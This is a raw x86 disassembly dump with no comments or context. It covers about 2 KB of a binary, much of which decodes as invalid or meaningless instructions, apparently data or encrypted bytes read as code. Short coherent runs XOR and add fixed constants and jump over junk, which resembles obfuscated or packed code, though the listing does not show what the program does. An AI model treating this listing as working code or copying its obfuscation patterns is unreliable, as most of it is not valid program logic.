  40c391:	adc    DWORD PTR [ecx+0x26f8d15e],ebx
  40c397:	cmc    
  40c398:	fiadd  WORD PTR [edx+0xb]
  40c39b:	inc    ecx
  40c39c:	mov    al,0x2b
  40c39e:	gs mov dh,0x7e
  40c3a1:	lods   al,BYTE PTR ds:[esi]
  40c3a2:	pop    eax
  40c3a3:	xchg   ecx,eax
  40c3a4:	pop    ebx
  40c3a5:	call   0x97ff0710
  40c3aa:	imul   ebp,DWORD PTR ds:0xc295d04c,0xffffffb8
  40c3b1:	push   eax
  40c3b2:	mov    edx,gs
  40c3b4:	inc    esi
  40c3b5:	les    ebp,FWORD PTR [ecx+eax*2]
  40c3b8:	scas   al,BYTE PTR es:[edi]
  40c3b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3ba:	enter  0xef1,0xa5
  40c3be:	push   ds
  40c3bf:	int    0x5e
  40c3c1:	out    dx,al
  40c3c2:	pop    eax
  40c3c3:	pop    edx
  40c3c4:	(bad)  
  40c3c5:	dec    ebx
  40c3c6:	mov    WORD PTR [ecx-0x71c04113],gs
  40c3cc:	add    al,0xc6
  40c3ce:	xlat   BYTE PTR ds:[ebx]
  40c3cf:	mov    ah,0xe8
  40c3d1:	cmp    ebx,DWORD PTR [ecx-0x4d9317f3]
  40c3d7:	jae    0x40c3cd
  40c3d9:	mov    dl,0x54
  40c3db:	inc    edx
  40c3dc:	xor    eax,esp
  40c3de:	stc    
  40c3df:	lds    eax,FWORD PTR [ebx]
  40c3e1:	lods   eax,DWORD PTR ds:[esi]
  40c3e2:	pop    esp
  40c3e3:	cwde   
  40c3e4:	pop    ds
  40c3e5:	bound  ebx,QWORD PTR ds:0xb9fc458b
  40c3eb:	push   esp
  40c3ec:	or     BYTE PTR [ecx+0x7],dl
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	sar    edi,cl
  40c447:	push   edx
  40c448:	dec    esp
  40c449:	int    0x14
  40c44b:	cmp    BYTE PTR [esi+0x7e],0x38
  40c44f:	jl     0x40c4cf
  40c451:	jle    0x40c495
  40c453:	push   edx
  40c454:	rcr    DWORD PTR [ecx],0xfc
  40c457:	push   0x82cc5b9c
  40c45c:	jmp    0xe7bb87be
  40c461:	or     bl,BYTE PTR [edi-0x317acd01]
  40c467:	lea    esp,[ebp+0x34710f85]
  40c46d:	daa    
  40c46e:	fstp   QWORD PTR [eax]
  40c470:	(bad)  
  40c471:	adc    edx,DWORD PTR [edi]
  40c473:	and    eax,0x816d7cac
  40c478:	jne    0x40c471
  40c47a:	dec    DWORD PTR [esp+eiz*8-0x72]
  40c47e:	and    BYTE PTR [edx-0x75],0xa
  40c482:	loopne 0x40c485
  40c484:	and    DWORD PTR [ecx-0x154e5dca],ebp
  40c48a:	push   ebx
  40c48b:	hlt    
  40c48c:	(bad)  
  40c48d:	shr    BYTE PTR [ecx],cl
  40c48f:	jns    0x40c4d9
  40c491:	repz add al,0x60
  40c494:	mov    DWORD PTR [ebp*8-0x3d6fab21],ebp
  40c49b:	jmp    0xb57d:0xb536450c
  40c4a2:	push   0xfad556f
  40c4a7:	jae    0x40c49c
  40c4a9:	cld    
  40c4aa:	mov    al,ds:0x58b44607
  40c4af:	and    eax,0x13d4fb2b
  40c4b4:	cwde   
  40c4b5:	fdiv   QWORD PTR [edx-0x43]
  40c4b8:	ret    0xaa43
  40c4bb:	pop    edx
  40c4bc:	stos   BYTE PTR es:[edi],al
  40c4bd:	shr    edx,1
  40c4bf:	or     edx,edi
  40c4c1:	mov    al,0x34
  40c4c3:	retf   
  40c4c4:	mov    cl,dl
  40c4c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4c7:	xchg   BYTE PTR ds:0xa4dca0fc,al
  40c4cd:	mov    ?,WORD PTR [esi+edi*4-0x2f4845b7]
  40c4d4:	mov    dl,0x6e
  40c4d6:	cs jmp 0xc278:0x2d70bdbf
  40c4de:	jg     0x40c4cd
  40c4e0:	retf   
  40c4e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4e2:	aam    0x17
  40c4e4:	sti    
  40c4e5:	mov    WORD PTR ds:0x75e4c7cd,?
  40c4eb:	test   dl,dl
  40c4ed:	cmp    dh,bl
  40c4ef:	mov    ds:0xaecd7906,eax
  40c4f4:	xchg   edx,eax
  40c4f5:	femms  
  40c4f7:	inc    edx
  40c4f8:	sbb    al,0xe6
  40c4fa:	stos   DWORD PTR es:[edi],eax
  40c4fb:	cld    
  40c4fc:	shl    DWORD PTR [edx-0x6d593db],1
  40c502:	dec    DWORD PTR [edi+0x33]
  40c505:	dec    esp
  40c506:	push   es
  40c507:	mov    WORD PTR [ecx+edx*2+0x42b4c759],gs
  40c50e:	dec    edi
  40c50f:	mov    edx,DWORD PTR [ebp*8+0x136f8ba0]
  40c516:	xchg   ecx,eax
  40c517:	stc    
  40c518:	xchg   ecx,eax
  40c519:	add    eax,0xee325746
  40c51e:	pop    esp
  40c51f:	xor    DWORD PTR [edi+0x63],esi
  40c522:	jmp    0xd989d497
  40c527:	sub    cl,bh
  40c529:	mov    es,WORD PTR [eax]
  40c52b:	fadd   QWORD PTR [ecx]
  40c52d:	push   edi
  40c52e:	mov    ebp,DWORD PTR ds:0x2bd86f26
  40c534:	push   cs
  40c535:	sti    
  40c536:	mov    edi,0x9d6f8096
  40c53b:	ss pop esi
  40c53d:	(bad)  
  40c53e:	ret    
  40c53f:	lods   al,BYTE PTR ds:[esi]
  40c540:	stos   DWORD PTR es:[edi],eax
  40c541:	leave  
  40c542:	into   
  40c543:	mov    DWORD PTR [eax+0x6],0xa645f001
  40c54a:	sub    al,0xfc
  40c54c:	cmp    BYTE PTR [edi-0x16f31e05],0x5
  40c553:	repnz cld 
  40c555:	jecxz  0x40c534
  40c557:	adc    DWORD PTR gs:[edi-0x7663ab7],edx
  40c55e:	leave  
  40c55f:	ds pop ds
  40c561:	xor    BYTE PTR [ebx],0xbf
  40c564:	ins    BYTE PTR es:[edi],dx
  40c565:	pop    edx
  40c566:	bnd jae 0x40c59e
  40c569:	mov    dh,dh
  40c56b:	xchg   ebp,eax
  40c56c:	repz mov bh,0x2b
  40c56f:	gs aam 0xe0
  40c572:	mov    ah,cl
  40c574:	popf   
  40c575:	repnz pop ss
  40c577:	mov    ebx,0x3df73f83
  40c57c:	fsubr  QWORD PTR [ebx-0x21]
  40c57f:	dec    esi
  40c580:	arpl   WORD PTR [eax+0x5c],sp
  40c583:	shr    DWORD PTR [eax+0x4c],cl
  40c586:	jle    0x40c547
  40c588:	add    eax,ebx
  40c58a:	push   es
  40c58b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c58c:	lods   eax,DWORD PTR ds:[esi]
  40c58d:	lahf   
  40c58e:	inc    edi
  40c58f:	mov    esp,DWORD PTR [eax]
  40c591:	iret   
  40c592:	and    al,0x8d
  40c594:	add    eax,0x7f1f6c67
  40c599:	jle    0x40c550
  40c59b:	ret    0x4121
  40c59e:	push   ecx
  40c59f:	sub    BYTE PTR fs:[edx],0xb6
  40c5a3:	inc    esp
  40c5a4:	fidiv  DWORD PTR [eax+ebx*4]
  40c5a7:	mov    ecx,0x31b1c728
  40c5ac:	gs dec ebp
  40c5ae:	ins    BYTE PTR es:[edi],dx
  40c5af:	rcr    DWORD PTR [eax-0x601f1c09],0x56
  40c5b6:	sahf   
  40c5b7:	loope  0x40c591
  40c5b9:	shl    BYTE PTR [ebx+0x36],cl
  40c5bc:	push   ecx
  40c5bd:	or     BYTE PTR [esi+0x10c4bd89],dl
  40c5c3:	sub    eax,0xab755ef3
  40c5c8:	inc    edx
  40c5c9:	cmp    al,0xb4
  40c5cb:	ins    DWORD PTR es:[edi],dx
  40c5cc:	push   es
  40c5cd:	in     al,0x89
  40c5cf:	js     0x40c5f7
  40c5d1:	and    edi,DWORD PTR [ecx-0x7ba8f619]
  40c5d7:	inc    ebp
  40c5d8:	push   ebp
  40c5d9:	jo     0x40c5a1
  40c5db:	push   cs
  40c5dc:	and    DWORD PTR [eax+0x5],edi
  40c5df:	xor    BYTE PTR [edi],bl
  40c5e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5e2:	and    al,0xb4
  40c5e4:	inc    eax
  40c5e5:	cld    
  40c5e6:	dec    ecx
  40c5e7:	jmp    0x392c:0x62665387
  40c5ee:	or     dl,BYTE PTR [ebp-0x7eee8bf9]
  40c5f4:	repnz jecxz 0x40c634
  40c5f7:	mov    ecx,0xd3428e83
  40c5fc:	inc    ecx
  40c5fd:	(bad)  
  40c5fe:	cmp    eax,0x2158d39f
  40c603:	lock cmp DWORD PTR [ebx-0x35a2f0b],0xffffffc2
  40c60b:	mov    eax,ebp
  40c60d:	push   cs
  40c60e:	mov    BYTE PTR [ebp+0x63],al
  40c611:	sub    esp,DWORD PTR [ebx-0x54]
  40c614:	mov    ds:0xb2cf27da,al
  40c619:	lods   al,BYTE PTR ds:[esi]
  40c61a:	jmp    0x40c5ce
  40c61c:	add    esi,eax
  40c61e:	aam    0x52
  40c620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c621:	ret    0xb9a4
  40c624:	adc    al,0x2a
  40c626:	cmp    edi,0x4d2b012b
  40c62c:	add    esi,DWORD PTR [edx+eiz*4+0xa]
  40c630:	mov    cl,0x84
  40c632:	xchg   esp,eax
  40c633:	loop   0x40c611
  40c635:	fs sbb al,0x16
  40c638:	jno    0x40c64d
  40c63a:	inc    esp
  40c63b:	mov    ch,0xa3
  40c63d:	sbb    dl,bl
  40c63f:	(bad)  
  40c640:	adc    DWORD PTR [eax+0x1e],0x4f3475fe
  40c647:	inc    esp
  40c648:	test   al,0x3e
  40c64a:	sub    eax,0xd540f99b
  40c650:	icebp  
  40c651:	mov    esp,0x6eff90f4
  40c656:	aam    0x58
  40c658:	das    
  40c659:	je     0x40c6c3
  40c65b:	in     al,0xd1
  40c65d:	cmp    ebp,DWORD PTR [ebx+edi*1+0x318232cc]
  40c664:	dec    edi
  40c665:	xor    bh,BYTE PTR [esi+0x59]
  40c668:	aad    0x39
  40c66a:	mov    esi,eax
  40c66c:	daa    
  40c66d:	xor    dh,BYTE PTR [ebx]
  40c66f:	hlt    
  40c670:	mov    BYTE PTR [esi-0x41d6f391],bl
  40c676:	fiadd  DWORD PTR [esi+0x13]
  40c679:	data16 std 
  40c67b:	mov    al,al
  40c67d:	sbb    esi,DWORD PTR [ebx+0x15]
  40c680:	shr    bl,0xf9
  40c683:	xor    bh,dl
  40c685:	cmp    eax,0x9a393bdc
  40c68a:	retf   0x109e
  40c68d:	ins    BYTE PTR es:[edi],dx
  40c68e:	mov    eax,ds:0x5bae156b
  40c693:	add    eax,0x3bcecbfb
  40c698:	mov    esi,0x32729b
  40c69d:	add    edi,esi
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp+0x7b7f9ac1],dl
  40c6de:	push   esi
  40c6df:	(bad)  
  40c6e0:	fiadd  WORD PTR [eax+0x7c387e7e]
  40c6e6:	jle    0x40c766
  40c6e8:	mov    ebp,0x8aecdbc8
  40c6ed:	push   eax
  40c6ee:	sti    
  40c6ef:	ins    BYTE PTR es:[edi],dx
  40c6f0:	jbe    0x40c685
  40c6f2:	fwait
  40c6f3:	or     bl,BYTE PTR [eax]
  40c6f5:	sbb    eax,0x7b5ad911
  40c6fa:	pop    ebp
  40c6fb:	test   DWORD PTR [ebp-0x2e4bdad4],ecx
  40c701:	cdq    
  40c702:	push   ds
  40c703:	pop    edi
  40c704:	loope  0x40c74a
  40c706:	pusha  
  40c707:	popf   
  40c708:	pop    esp
  40c709:	(bad)  
  40c70a:	inc    esp
  40c70b:	add    eax,0xf278d51
  40c710:	lock ds popf 
  40c713:	shr    ch,cl
  40c715:	xor    ebx,esp
  40c717:	packuswb mm6,QWORD PTR [esi-0x253f61c1]
  40c71e:	dec    DWORD PTR [eax+0x32]
  40c721:	stc    
  40c722:	dec    edx
  40c723:	sti    
  40c724:	and    al,0xab
  40c726:	xchg   edi,eax
  40c727:	mov    esi,0xd4c4a56
  40c72c:	adc    esp,DWORD PTR [ecx]
  40c72e:	mov    ah,0xac
  40c730:	rol    esp,0x65
  40c733:	call   0x6b35e0fa
  40c738:	xor    bl,BYTE PTR [esi+0x6e3ce323]
  40c73e:	sbb    DWORD PTR [bp+si-0x31],edi
  40c742:	sbb    BYTE PTR [esi],bl
  40c744:	pop    ebp
  40c745:	dec    edx
  40c746:	(bad)  
  40c747:	xchg   edx,eax
  40c748:	push   eax
  40c749:	(bad)  [esi+ecx*2+0x746300fe]
  40c750:	fidivr WORD PTR ss:[ebp+0x77]
  40c754:	outs   dx,DWORD PTR ds:[esi]
  40c755:	jmp    0xbe087060
  40c75a:	jg     0x40c7ca
  40c75c:	out    dx,eax
  40c75d:	ds dec edi
  40c75f:	sbb    al,BYTE PTR [ecx]
  40c761:	addr16 mov ch,0x16
  40c764:	push   esi
  40c765:	cmp    DWORD PTR [ebp-0x5ac70deb],ebx
  40c76b:	adc    DWORD PTR [edx-0x62],ecx
  40c76e:	jecxz  0x40c732
  40c770:	cmp    BYTE PTR ds:0x66a6d6a7,al
  40c776:	mov    eax,ds:0x30e21e90
  40c77b:	test   BYTE PTR [edi],0xd2
  40c77e:	fwait
  40c77f:	and    eax,DWORD PTR [eax+0x4c]
  40c782:	xchg   esi,eax
  40c783:	xor    al,0xca
  40c785:	test   eax,0x333fc702
  40c78a:	sub    bl,BYTE PTR [edi+ecx*1-0x2b]
  40c78e:	inc    ebp
  40c78f:	bound  esi,QWORD PTR [ecx-0x1c]
  40c792:	push   0xf6dc7ee2
  40c797:	xor    ecx,DWORD PTR [esi+0x22]
  40c79a:	fisub  WORD PTR [eax+0x8842065]
  40c7a0:	jae    0x40c7bf
  40c7a2:	jmp    0x52fcdf0b
  40c7a7:	mov    gs,WORD PTR [eax]
  40c7a9:	mov    bh,0x7b
  40c7ab:	idiv   DWORD PTR [ebp-0x5b7a5f2a]
  40c7b1:	sbb    eax,0xb000df8f
  40c7b6:	mov    WORD PTR [esi-0x673886c8],fs
  40c7bc:	xchg   ecx,eax
  40c7bd:	into   
  40c7be:	sar    BYTE PTR [eax+0x3a4281d5],cl
  40c7c4:	xor    al,0x21
  40c7c6:	sub    eax,0x2c32d48c
  40c7cb:	ss cdq 
  40c7cd:	call   0x4d1726f3
  40c7d2:	lods   eax,DWORD PTR ds:[esi]
  40c7d3:	cmp    DWORD PTR [edx],ecx
  40c7d5:	or     DWORD PTR [edi-0x6c],0x7a
  40c7d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7da:	mov    BYTE PTR [ecx+0x2469bab3],dl
  40c7e0:	push   ebx
  40c7e1:	mov    al,0xb2
  40c7e3:	dec    esp
  40c7e4:	push   edx
  40c7e5:	mov    eax,0xe1582995
  40c7ea:	inc    esp
  40c7eb:	jno    0x40c781
  40c7ed:	leave  
  40c7ee:	sub    al,0xcf
  40c7f0:	sub    BYTE PTR [esi-0x2b],bl
  40c7f3:	fcomp  DWORD PTR [ebx+0x4b]
  40c7f6:	pop    esi
  40c7f7:	ret    
  40c7f8:	in     eax,dx
  40c7f9:	xor    eax,0x67405b7f
  40c7fe:	jo     0x40c832
  40c800:	push   esp
  40c801:	or     al,0x39
  40c803:	xchg   esi,eax
  40c804:	stos   DWORD PTR es:[edi],eax
  40c805:	(bad)  
  40c806:	fcom   DWORD PTR ds:0xb76e4ed3
  40c80c:	push   edi
  40c80d:	inc    ebx
  40c80e:	ds or  dh,dl
  40c811:	ja     0x40c7f6
  40c813:	scas   al,BYTE PTR es:[edi]
  40c814:	jo     0x40c7f4
  40c816:	jle    0x40c848
  40c818:	stos   BYTE PTR es:[edi],al
  40c819:	sar    BYTE PTR [edx],0xef
  40c81c:	pop    ecx
  40c81d:	cwde   
  40c81e:	scas   al,BYTE PTR es:[edi]
  40c81f:	fs ss jnp 0x40c825
  40c823:	out    dx,eax
  40c824:	dec    esi
  40c825:	fwait
  40c826:	sub    dh,dh
  40c828:	mov    ebx,0x38bf999
  40c82d:	dec    eax
  40c82e:	icebp  
  40c82f:	fadd   DWORD PTR [edi-0x80]
  40c832:	adc    DWORD PTR [edx-0x43990c43],0xe3b3e996
  40c83c:	add    BYTE PTR ds:0x9c62616f,bl
  40c842:	jne    0x40c7fe
  40c844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c845:	push   ebx
  40c846:	mov    DWORD PTR [esi],esp
  40c848:	outs   dx,DWORD PTR ds:[esi]
  40c849:	add    eax,0xb08219c1
  40c84e:	mov    eax,ds:0x591568f0
  40c853:	pop    ds
  40c854:	clc    
  40c855:	xchg   esp,eax
  40c856:	cmp    BYTE PTR [eax],ch
  40c858:	or     DWORD PTR [ebx+0x19],edx
  40c85b:	fwait
  40c85c:	sub    BYTE PTR [edi+eiz*4],dh
  40c85f:	push   ds
  40c860:	mov    esp,0xfad2dea
  40c865:	arpl   bx,cx
  40c867:	int3   
  40c868:	frstor [ebx+0x6fb4c005]
  40c86e:	aam    0xe1
  40c870:	(bad)
  40c874:	sbb    BYTE PTR [ebx],cl
  40c876:	mov    gs,WORD PTR [ecx+edx*2-0x61ac6536]
  40c87d:	pop    esi
  40c87e:	ftst   
  40c880:	dec    edx
  40c881:	mov    ds:0xc006fd49,eax
  40c886:	mov    ds:0x804442df,eax
  40c88b:	add    al,0xda
  40c88d:	xchg   DWORD PTR [eax-0x78],edi
  40c890:	xor    BYTE PTR [edi+0x72a55730],ah
  40c896:	jmp    0xc6fd:0x28614c1e
  40c89d:	jo     0x40c826
  40c89f:	imul   edx,DWORD PTR [eax+0x3275ff73],0xffffffe2
  40c8a6:	jae    0x40c90c
  40c8a8:	adc    eax,DWORD PTR [ebx+eiz*1]
  40c8ab:	mov    esi,0x9547c9fe
  40c8b0:	jb     0x40c8c0
  40c8b2:	mov    ch,0x5e
  40c8b4:	jl     0x40c8e6
  40c8b6:	ret    0x5536
  40c8b9:	or     bl,BYTE PTR [edi+0x41e0bb94]
  40c8bf:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40c8c1:	and    BYTE PTR [edx],dh
  40c8c3:	sbb    esi,ebp
  40c8c5:	dec    edx
  40c8c6:	or     eax,0xf7393969
  40c8cb:	pusha  
  40c8cc:	jle    0x40c88d
  40c8ce:	xchg   edi,eax
  40c8cf:	jb     0x40c8d9
  40c8d1:	test   eax,0xa6d7118d
  40c8d6:	add    bh,BYTE PTR [ecx+ebp*8-0x5d]
  40c8da:	je     0x40c901
  40c8dc:	stos   DWORD PTR es:[edi],eax
  40c8dd:	pushf  
  40c8de:	mov    ecx,0x9b0ff930
  40c8e3:	sbb    eax,0x82736231
  40c8e8:	fstp   DWORD PTR [eax+0x69]
  40c8eb:	fadd   st,st(2)
  40c8ed:	stos   DWORD PTR es:[edi],eax
  40c8ee:	xchg   ebx,eax
  40c8ef:	(bad)  
  40c8f0:	fisubr DWORD PTR [edi-0x28201254]
  40c8f6:	jmp    0x13cd:0x4e9a49e1
  40c8fd:	add    eax,DWORD PTR [edx+0xd137202]
  40c903:	stos   DWORD PTR es:[edi],eax
  40c904:	dec    ebx
  40c905:	adc    esp,ebp
  40c907:	dec    ecx
  40c908:	gs pop ebp
  40c90a:	mov    esi,0x8e25f086
  40c90f:	jmp    0x6a6572f4
  40c914:	data16 fsubr DWORD PTR [edi-0x2174c046]
  40c91b:	adc    dl,bl
  40c91d:	add    DWORD PTR [bx+si+0x21db],ebx
  40c922:	test   eax,0x71458bee
  40c927:	fild   WORD PTR [esi+0x1ea20f21]
  40c92d:	ror    BYTE PTR [ebx-0x3eccebab],cl
  40c933:	jmp    0x40cb96
  40c938:	pop    es
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [edi+ecx*4-0x51],edx
  40c947:	scas   eax,DWORD PTR es:[edi]
  40c948:	cwde   
  40c949:	mov    ?,WORD PTR [esi+0x7e]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	jle    0x40c906
  40c952:	fs stc 
  40c954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c955:	fs retf 
  40c957:	out    dx,eax
  40c958:	xchg   ebx,eax
  40c959:	sbb    BYTE PTR [eax+0x12],ch
  40c95c:	inc    edx
  40c95d:	call   FWORD PTR [ecx-0x29]
  40c960:	das    
  40c961:	out    dx,eax
  40c962:	out    dx,al
  40c963:	xchg   ecx,eax
  40c964:	mov    ecx,0x9303667c
  40c969:	(bad)  
  40c96a:	mov    ecx,0x96abbd46
  40c96f:	scas   eax,DWORD PTR es:[edi]
  40c970:	ins    DWORD PTR es:[edi],dx
  40c971:	mov    dh,0x27
  40c973:	pop    edx
  40c974:	and    eax,0x53f76ae0
  40c979:	mov    ebp,0x96abe024
  40c97e:	cli    
  40c97f:	pop    es
  40c980:	and    eax,DWORD PTR [esi-0xde428d]
  40c986:	mov    al,ds:0xe57dd7a6
  40c98b:	icebp  
  40c98c:	and    edx,DWORD PTR [edx]
  40c98e:	xchg   ecx,eax
  40c98f:	test   DWORD PTR [edi],ecx
  40c991:	scas   eax,DWORD PTR es:[edi]
  40c992:	fnstcw WORD PTR [ebx]
  40c994:	add    cl,cl
  40c996:	rcr    DWORD PTR ds:0x5eac37aa,cl
  40c99c:	hlt    
  40c99d:	icebp  
  40c99e:	sub    al,0x7d
  40c9a0:	test   BYTE PTR [ecx],al
  40c9a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9a3:	jae    0x40c9f2
  40c9a5:	mov    ch,cl
  40c9a7:	add    BYTE PTR [ebp+edx*1-0x5],ch
  40c9ab:	das    
  40c9ac:	sub    esi,ebp
  40c9ae:	mov    esi,eax
  40c9b0:	xor    eax,0xa98a600f
  40c9b5:	sub    edx,esp
  40c9b7:	jbe    0x40ca14
  40c9b9:	pop    edx
  40c9ba:	xor    esp,DWORD PTR [esi]
  40c9bc:	hlt    
  40c9bd:	hlt    
  40c9be:	sahf   
  40c9bf:	test   eax,0x1c7064e1
  40c9c4:	sahf   
  40c9c5:	push   cs
  40c9c6:	xchg   edx,eax
  40c9c7:	adc    eax,0xf608ff0b
  40c9cc:	ret    
  40c9cd:	popf   
  40c9ce:	mov    edx,0xb2c90b12
  40c9d3:	jge    0x40ca37
  40c9d5:	jb     0x40ca25
  40c9d7:	inc    edx
  40c9d8:	(bad)  
  40c9d9:	shl    BYTE PTR [edi],1
  40c9db:	js     0x40c9ad
  40c9dd:	bswap  ecx
  40c9df:	je     0x40ca50
  40c9e1:	cmp    DWORD PTR [edx+ebp*8],esi
  40c9e4:	stc    
  40c9e5:	outs   dx,BYTE PTR ds:[esi]
  40c9e6:	repnz push ds
  40c9e8:	sub    eax,0x371d656c
  40c9ed:	test   eax,0x1c538406
  40c9f2:	add    BYTE PTR [edi],cl
  40c9f4:	or     eax,0x7911ab6c
  40c9f9:	stos   BYTE PTR es:[edi],al
  40c9fa:	ret    0xf6f4
  40c9fd:	fnsave [eax]
  40c9ff:	push   ds
  40ca00:	push   0xe7731502
  40ca05:	cwde   
  40ca06:	or     DWORD PTR [eax-0x2f],ebp
  40ca09:	jle    0x40c9e6
  40ca0b:	shl    BYTE PTR [ecx+0x4b],0x8d
  40ca0f:	sbb    DWORD PTR [edi+0x7d],edx
  40ca12:	xchg   edx,eax
  40ca13:	sbb    BYTE PTR [esi+0x3f],ah
  40ca16:	fadd   DWORD PTR [edi-0x3711710a]
  40ca1c:	test   eax,0x4c2a047f
  40ca21:	pop    esi
  40ca22:	rcr    BYTE PTR [eax+0x2f],1
  40ca25:	(bad)  
  40ca26:	fist   DWORD PTR [edx-0x12718058]
  40ca2c:	scas   al,BYTE PTR es:[edi]
  40ca2d:	or     esi,ebp
  40ca2f:	cs add eax,0x5a7b51a3
  40ca35:	loope  0x40ca54
  40ca37:	jne    0x40ca12
  40ca39:	jo     0x40caa6
  40ca3b:	xor    dl,dh
  40ca3d:	enter  0xd06a,0x48
  40ca41:	sub    DWORD PTR [esi+0x1c],0x52
  40ca45:	pop    ds
  40ca46:	jg     0x40c9db
  40ca48:	rcl    BYTE PTR [eax],1
  40ca4a:	scas   eax,DWORD PTR es:[edi]
  40ca4b:	xchg   esp,eax
  40ca4c:	jmp    0xcee6:0x709b9e1c
  40ca53:	jmp    0x63d5:0xe2293e83
  40ca5a:	xchg   edi,eax
  40ca5b:	in     al,0x63
  40ca5d:	cmp    eax,0x1915ff2c
  40ca62:	mov    eax,ds:0xabe3307f
  40ca67:	adc    ch,BYTE PTR es:[edi]
  40ca6a:	inc    esi
  40ca6b:	and    edx,ebp
  40ca6d:	arpl   WORD PTR [eax-0x536001b7],si
  40ca73:	mov    dh,0xfa
  40ca75:	addr16 aas 
  40ca77:	in     eax,0xd
  40ca79:	ja     0x40ca58
  40ca7b:	jp     0x40ca68
  40ca7d:	cli    
  40ca7e:	(bad)  
  40ca7f:	cmp    BYTE PTR [ebp+0x2c],al
  40ca82:	popa   
  40ca83:	hlt    
  40ca84:	mov    ebp,0x8207af7b
  40ca89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca8a:	retf   0xb99d
  40ca8d:	push   0x7407ac9b
  40ca92:	ja     0x40ca94
  40ca94:	imul   ebx,DWORD PTR [esi-0x78],0xffffffbd
  40ca98:	lock (bad) 
  40ca9a:	outs   dx,BYTE PTR ds:[esi]
  40ca9b:	or     ebp,ecx
  40ca9d:	and    ecx,esp
  40ca9f:	jl     0x40caf6
  40caa1:	aaa    
  40caa2:	cmp    eax,DWORD PTR [edx]
  40caa4:	dec    esi
  40caa5:	mov    bh,0xe5
  40caa7:	push   0xc22f905d
  40caac:	stos   BYTE PTR es:[edi],al
  40caad:	cmp    DWORD PTR ds:0x73b15e59,ecx
  40cab3:	adc    eax,0xb1e01982
  40cab8:	bound  edi,QWORD PTR [edi-0x4f]
  40cabb:	dec    eax
  40cabc:	xchg   DWORD PTR [edx],edi
  40cabe:	or     DWORD PTR [edx+0x610845c],ebp
  40cac4:	inc    DWORD PTR [eax+0x7]
  40cac7:	out    0xff,eax
  40cac9:	into   
  40caca:	cld    
  40cacb:	xor    esi,esi
  40cacd:	mov    bh,BYTE PTR [edi+eiz*8+0x35f7bc55]
  40cad4:	inc    ecx
  40cad5:	pop    esp
  40cad6:	fmul   DWORD PTR [ebp+0x62e1ef0b]
  40cadc:	mov    WORD PTR [ebp-0x15],ds
  40cadf:	and    eax,0x84883f2d
  40cae4:	xor    al,0xf2
  40cae6:	xor    eax,0x496e5e9
  40caeb:	dec    di
  40caed:	push   ebx
  40caee:	mov    bh,0x47
  40caf0:	sub    al,0xa7
  40caf2:	(bad)  
  40caf3:	(bad)  
  40caf4:	dec    DWORD PTR [ecx+0xba3a5da]
  40cafa:	test   bh,bh
  40cafc:	js     0x40ca7f
  40cafe:	lods   eax,DWORD PTR ds:[esi]
  40caff:	cwde   
  40cb00:	push   esi
  40cb01:	mov    ebx,0x1634630a
  40cb06:	or     DWORD PTR [ecx],esp
  40cb08:	sbb    BYTE PTR [ecx+0x5d],dh
  40cb0b:	ins    DWORD PTR es:[edi],dx
  40cb0c:	aam    0xde
  40cb0e:	clc    
  40cb0f:	sub    BYTE PTR [eax],al
  40cb11:	scas   al,BYTE PTR es:[edi]
  40cb12:	in     al,dx
  40cb13:	pushf  
  40cb14:	retf   0x6ec7
  40cb17:	or     al,0x45
  40cb19:	dec    ebx
  40cb1a:	fst    st(4)
  40cb1c:	push   edx
  40cb1d:	sbb    ebp,0x54
